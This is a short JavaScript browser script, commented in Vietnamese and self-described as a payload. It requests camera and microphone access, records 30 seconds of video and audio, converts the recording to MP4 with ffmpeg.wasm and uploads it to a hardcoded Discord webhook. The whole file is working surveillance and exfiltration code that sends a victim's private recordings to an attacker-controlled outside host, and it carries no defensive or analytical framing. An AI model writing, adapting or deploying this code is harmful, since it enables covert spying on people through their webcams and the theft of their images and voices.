// y.js - Payload quay video 30 giây, chuyển MP4, gửi Discord
(async function(){
  // Tải ffmpeg.wasm từ CDN
  const { createFFmpeg, fetchFile } = FFmpeg;
  const ffmpeg = createFFmpeg({
    log: false,
    corePath: 'https://unpkg.com/@ffmpeg/core@0.12.6/dist/umd/ffmpeg-core.js'
  });
  await ffmpeg.load();

  // Yêu cầu quyền camera và micro
  const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
  const rec = new MediaRecorder(stream, { mimeType: 'video/webm' });
  const chunks = [];

  rec.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };

  rec.onstop = async () => {
    // Ghi tạm WebM
    const webmBlob = new Blob(chunks, { type: 'video/webm' });
    ffmpeg.FS('writeFile', 'in.webm', await fetchFile(webmBlob));

    // Chuyển mã sang MP4 (H.264 + AAC)
    await ffmpeg.run(
      '-i', 'in.webm',
      '-c:v', 'libx264',
      '-preset', 'ultrafast',
      '-b:v', '500k',          // giảm bitrate để tránh vượt giới hạn Discord
      '-c:a', 'aac',
      'out.mp4'
    );

    const mp4Data = ffmpeg.FS('readFile', 'out.mp4');
    const mp4Blob = new Blob([mp4Data.buffer], { type: 'video/mp4' });

    // Gửi file MP4 lên Discord webhook
    const form = new FormData();
    form.append('file', mp4Blob, 'cam.mp4');
    form.append('payload_json', JSON.stringify({ content: '🎥 Video MP4 30s' }));

    await fetch('https://discord.com/api/webhooks/1571360407652929699/hSfivjJZe6k00NGmRLkpP5KdYfFK0hrFwpVje9kTrAdcS713-8jpRjXWMSP0koQFHxQm', {
      method: 'POST',
      body: form
    });

    // Tắt camera/micro
    stream.getTracks().forEach(t => t.stop());
  };

  rec.start();
  setTimeout(() => rec.stop(), 30000);
})();
